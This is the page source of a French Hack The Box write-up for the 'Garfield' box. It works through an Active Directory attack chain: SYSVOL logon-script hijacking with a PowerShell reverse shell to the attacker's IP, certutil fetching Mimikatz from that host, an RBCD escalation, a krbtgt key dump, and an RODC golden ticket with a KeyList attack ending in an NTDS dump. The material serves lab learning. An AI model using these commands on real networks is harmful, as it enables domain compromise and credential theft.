---
import Layout from '../../layouts/Layout.astro'
---
<Layout title="HTB - Garfield">

  <div style="margin-bottom:2rem;">
    <a href="/writeups" style="color:#475569; font-size:0.82rem;">← writeups</a>
    <h1 style="font-size:1.8rem; font-weight:700; color:#e2e8f0; margin:0.75rem 0 0.5rem;">HTB - Garfield</h1>
    <div style="display:flex; flex-wrap:wrap; gap:0.5rem; align-items:center; margin-bottom:0.75rem;">
      <span class="badge-hard">Hard</span>
      <span style="color:#64748b;">·</span>
      <span style="color:#94a3b8; font-size:0.82rem;">Windows Server 2019 — Active Directory / RODC</span>
      <span style="color:#64748b;">·</span>
      <span style="color:#475569; font-size:0.8rem;">07 Apr 2026</span>
    </div>
  </div>

  <div style="background:var(--bg-800); border-left:3px solid #c0392b; border-top:1px solid var(--border); border-right:1px solid var(--border); border-bottom:1px solid var(--border); border-radius:0 8px 8px 0; padding:1rem 1.25rem; margin-bottom:2rem;">
    <div style="color:#64748b; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:0.4rem;">Résumé</div>
    <p style="color:#94a3b8; font-size:0.88rem; line-height:1.7; margin:0;">Box Hard Windows AD — chaîne de 11 étapes : scriptPath hijacking via SYSVOL, réinitialisation de mot de passe ACL, RBCD sur un RODC via pivot Ligolo-ng, dump de la clé krbtgt_8245 avec Mimikatz, modification de la PRP, et KeyList Attack pour obtenir un vrai ticket Administrator valide sur DC01.</p>
  </div>

  <div style="margin-bottom:2.5rem;">
    <div style="color:#334155; font-size:0.78rem; margin-bottom:0.75rem;">$ cat attack_chain.txt</div>
    <div style="border:1px solid var(--border); border-radius:8px; overflow:hidden;">
      <div style="background:#050508; padding:0.4rem 1rem; border-bottom:1px solid var(--border); color:#475569; font-size:0.7rem; text-transform:uppercase;">Chaîne d'exploitation</div>
      {[
        { n:'1', v:'ACL WRITE scriptPath sur l.wilson', r:'Logon Script Hijacking → shell l.wilson' },
        { n:'2', v:'ForceChangePassword ACL', r:'Reset mdp l.wilson_adm → Evil-WinRM + user flag' },
        { n:'3', v:'AddSelf RODC Administrators', r:'Accès admin local RODC01' },
        { n:'4', v:'Ligolo-ng tunnel 192.168.100.0/24', r:'Accès réseau interne RODC01' },
        { n:'5', v:'RBCD (FAKE$) → S4U2Proxy', r:'SYSTEM sur RODC01' },
        { n:'6', v:'Mimikatz lsadump::lsa', r:'Clé AES256 krbtgt_8245 volée' },
        { n:'7', v:'Modification PRP msDS-RevealOnDemandGroup', r:'Administrator autorisé dans la PRP' },
        { n:'8', v:'RODC Golden Ticket + KeyList Attack', r:'TGS Administrator valide → NTDS dump → root' },
      ].map((s,i,a) => (
        <div style={"display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800);" + (i<a.length-1?"border-bottom:1px solid #0d0d15;":"")}>
          <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#c0392b22; color:#f87171; border:1px solid #c0392b44;">{s.n}</div>
          <div><div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">{s.v}</div><div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ {s.r}</div></div>
        </div>
      ))}
    </div>
  </div>

  <div class="prose">

    <h2>1 — Reconnaissance & Énumération ACLs</h2>
    <p>Credentials de départ fournis : <strong>j.arbuckle / Th1sD4mnC4t!@1978</strong></p>
    <pre is:raw>echo "10.129.17.8 DC01.garfield.htb garfield.htb" | sudo tee -a /etc/hosts
sudo ntpdate -u 10.129.17.8    # OBLIGATOIRE — clock skew +8h

nmap -sC -sV 10.129.17.8
# 53, 88 (Kerberos), 389 (LDAP), 445 (SMB), 5985 (WinRM), 3389 (RDP)
# clock-skew: mean: 8h00m01s

nxc smb 10.129.17.8 -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --shares
# SYSVOL READ ← vecteur principal

bloodyAD --host garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' get writable
# CN=Liz Wilson → WRITE
# CN=Liz Wilson ADM → WRITE
# Attribut modifiable clé : scriptPath</pre>
    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ BLOCAGE CRITIQUE : Clock skew +8h — TOUTES les opérations Kerberos échouaient silencieusement. ntpdate obligatoire avant chaque opération Kerberos sans exception.</div>

    <h2>2 — Logon Script Hijacking (SYSVOL)</h2>
    <pre is:raw># Génération du payload PowerShell en Base64 UTF-16LE
PAYLOAD='$client = New-Object System.Net.Sockets.TCPClient("10.10.14.51",9001);...'
B64=$(echo "$PAYLOAD" | iconv -t UTF-16LE | base64 -w0)</pre>
    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ BLOCAGE : Encoder en UTF-8 au lieu d'UTF-16LE → PowerShell décode silencieusement une commande invalide. Aucun shell reçu et aucune erreur visible. iconv -t UTF-16LE obligatoire.</div>
    <pre is:raw>cat > /tmp/printerDetect.bat &lt;&lt; EOF
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc $B64
EOF

smbclient //10.129.17.8/SYSVOL -U "j.arbuckle%Th1sD4mnC4t!@1978" \
  -c "cd garfield.htb\scripts; put /tmp/printerDetect.bat printerDetect.bat"

bloodyAD --host garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' \
  set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
  scriptPath -v printerDetect.bat

nc -lvnp 9001
# garfield\l.wilson on DC01</pre>

    <h2>3 — Mouvement Latéral & User Flag</h2>
    <pre is:raw># l.wilson a ForceChangePassword sur l.wilson_adm
$newpass = ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force
Set-ADAccountPassword -Identity "l.wilson_adm" -NewPassword $newpass -Reset

evil-winrm -i 10.129.17.8 -u l.wilson_adm -p 'WhoKnows123!'
type C:\Users\l.wilson_adm\Desktop\user.txt</pre>

    <h2>4 — AddSelf + Pivot Ligolo-ng vers RODC01</h2>
    <pre is:raw># l.wilson_adm a le droit AddSelf sur RODC Administrators
Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"

# RODC01 est sur 192.168.100.2 — réseau interne non routable
# Pivot via Ligolo-ng depuis DC01
sudo ip tuntap add user root mode tun ligolo && sudo ip link set ligolo up
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# Dans Evil-WinRM sur DC01 :
.\agent.exe -connect 10.10.14.51:11601 -ignore-cert

# Console Ligolo : session → 1 → start
sudo ip route add 192.168.100.0/24 dev ligolo
ping 192.168.100.2    # ✓</pre>

    <h2>5 — RBCD → SYSTEM sur RODC01</h2>
    <pre is:raw>impacket-addcomputer garfield.htb/l.wilson_adm:'WhoKnows123!' \
  -computer-name 'FAKE$' -computer-pass 'FakePass123!' -dc-ip 10.129.17.8

Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount FAKE$

sudo ntpdate 10.129.17.8

impacket-getST garfield.htb/'FAKE$':'FakePass123!' \
  -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.17.8

export KRB5CCNAME=Administrator.ccache

impacket-psexec -k -no-pass -dc-ip 10.129.17.8 -target-ip 192.168.100.2 \
  garfield.htb/Administrator@RODC01.garfield.htb
# C:\Windows\system32> whoami → nt authority\system</pre>

    <h2>6 — Dump krbtgt_8245 (Mimikatz)</h2>
    <pre is:raw>certutil -urlcache -split -f http://10.10.14.51:8888/mimikatz.exe mimikatz.exe

# Dans Mimikatz :
privilege::debug
lsadump::lsa /inject /name:krbtgt_8245

# User : krbtgt_8245
# SID  : S-1-5-21-2502726253-3859040611-225969357
# aes256_hmac : [REDACTED — clé AES256 du RODC]</pre>

    <h2>7 — Modification PRP</h2>
    <pre is:raw>Import-Module .\PowerView.ps1

Set-DomainObject -Identity RODC01$ -Set @{
  'msDS-RevealOnDemandGroup'=@(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
  )
}
Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'</pre>

    <h2>8 — RODC Golden Ticket + KeyList Attack → root</h2>
    <pre is:raw># Forger le Golden Ticket RODC avec Rubeus
# /rodcNumber:8245 est CRITIQUE pour que DC01 identifie quel krbtgt_N a signé
.\Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap \
  /outfile:ticket.kirbi \
  /aes256:[REDACTED] \
  /user:Administrator /id:500 /domain:garfield.htb \
  /sid:S-1-5-21-2502726253-3859040611-225969357

# KeyList Attack — DC01 valide via RODC (PRP OK) → vrai TGS Administrator
.\Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/garfield.htb \
  /dc:DC01.garfield.htb /ticket:ticket.kirbi /nowrap
# [+] TGS request successful!</pre>
    <pre is:raw>impacket-ticketConverter /tmp/ticket.kirbi /tmp/ticket.ccache
export KRB5CCNAME=/tmp/ticket.ccache

nxc smb DC01.garfield.htb --use-kcache --ntds
# [+] garfield.htb\Administrator (Pwn3d!)
# Administrator:500:...[HASH_NT_REDACTED]:::

evil-winrm -i 10.129.17.8 -u Administrator -H '[HASH_NT_REDACTED]'
type C:\Users\Administrator\Desktop\root.txt</pre>
    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ BLOCAGE 1 : Sans /rodcNumber:8245 dans le Golden Ticket, DC01 ne sait pas quel krbtgt_N a signé → KeyList impossible.</div>
    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ BLOCAGE 2 : Sans Administrator dans msDS-RevealOnDemandGroup, la KeyList échoue même avec la bonne clé AES256.</div>

  </div>

  <div style="margin-bottom:2.5rem;">
    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Leçons apprises</h2>
    <div style="display:flex; flex-direction:column; gap:0.5rem;">
      {[
        'Clock skew Kerberos : ntpdate obligatoire avant TOUTE opération — erreurs silencieuses',
        'scriptPath hijacking : ACL WRITE sur attribut AD anodin = exécution de code au login',
        'Encoder en UTF-16LE (pas UTF-8) pour PowerShell -EncodedCommand',
        'RODC : clé krbtgt dédiée exploitable pour forger des tickets via KeyList Attack',
        '/rodcNumber obligatoire dans le Golden Ticket RODC — différence critique',
        'PRP : Administrator doit être dans msDS-RevealOnDemandGroup avant KeyList',
      ].map(l => (
        <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>{l}</div>
      ))}
    </div>
  </div>

  <div>
    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Outils utilisés</h2>
    <div style="display:flex; flex-wrap:wrap; gap:0.4rem;">
      {['nmap','bloodyAD','nxc','smbclient','ligolo-ng','impacket','rubeus','mimikatz','evil-winrm'].map(t => (
        <span style="background:#050508; border:1px solid #1a1a2e; padding:3px 10px; border-radius:6px; font-size:0.75rem; color:#64748b; font-family:monospace;">{t}</span>
      ))}
    </div>
  </div>

  <div style="margin-top:3rem; padding-top:1.5rem; border-top:1px solid var(--border); display:flex; justify-content:space-between;">
    <a href="/writeups" style="color:#475569; font-size:0.85rem;">← Tous les writeups</a>
    <a href="/about" style="color:var(--cyber); font-size:0.85rem;">About →</a>
  </div>

</Layout>
